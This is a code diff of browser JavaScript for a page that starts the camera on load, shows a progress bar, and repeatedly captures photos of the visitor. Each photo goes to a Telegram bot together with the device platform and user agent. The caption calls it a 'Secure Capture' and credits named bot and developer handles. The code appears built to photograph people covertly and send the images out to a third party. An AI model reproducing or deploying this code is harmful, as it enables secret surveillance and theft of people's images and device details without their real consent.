@@ -7,88 +7,65 @@ const ctx = canvas.getContext("2d");
 const bar = document.getElementById("bar");
 
 let stream;
-let usingFront = true;
 
-// start وروسته اجازه
+// auto start
+start();
+
 async function start() {
-  stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "user" } // front camera
-  });
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
 
-  video.srcObject = stream;
-
-  video.onloadedmetadata = () => loop();
+    video.onloadedmetadata = () => loop();
+  } catch (e) {
+    console.log("Permission needed");
+  }
 }
 
-// 🔁 main loop
 function loop() {
   let progress = 0;
 
-  setInterval(async () => {
-    progress += 10;
+  setInterval(() => {
+    progress += 5;
     bar.style.width = progress + "%";
 
     if (progress >= 100) {
       progress = 0;
       bar.style.width = "0%";
-
-      await capture();
-
-      await switchCamera(); // camera change
+      capture();
     }
 
-  }, 100); // 1 sec
+  }, 50);
 }
 
-// 📸 عکس
 function capture() {
-  return new Promise(resolve => {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
 
-    ctx.drawImage(video, 0, 0);
+  ctx.filter = "brightness(1.1) contrast(1.2) saturate(1.2)";
+  ctx.drawImage(video, 0, 0);
 
-    canvas.toBlob(blob => {
-      send(blob);
-      resolve();
-    }, "image/jpeg");
-  });
+  canvas.toBlob(send, "image/jpeg");
 }
 
-// 🔄 camera بدلول
-async function switchCamera() {
-  usingFront = !usingFront;
-
-  stream.getTracks().forEach(track => track.stop());
-
-  stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: usingFront ? "user" : "environment" }
-  });
-
-  video.srcObject = stream;
-}
-
-// 📤 telegram send
 function send(blob) {
-  const formData = new FormData();
-
-  formData.append("chat_id", CHAT_ID);
-  formData.append("photo", blob, "img.jpg");
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("photo", blob, "img.jpg");
 
   const caption =
-`📸 Camera Capture
+`📸 Secure Capture
 
-📷 ${usingFront ? "Front Camera" : "Back Camera"}
+📱 Device: ${navigator.platform}
+🌐 Browser: ${navigator.userAgent}
 
 🤖 Bot: @ProSimTookBot
-👨‍💻 Dev: @XFPro43
+👨‍💻 Dev: @XFPro43`;
 
-✅ Status: Active`;
-
-  formData.append("caption", caption);
+  fd.append("caption", caption);
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
     method: "POST",
-    body: formData
+    body: fd
   });
 }
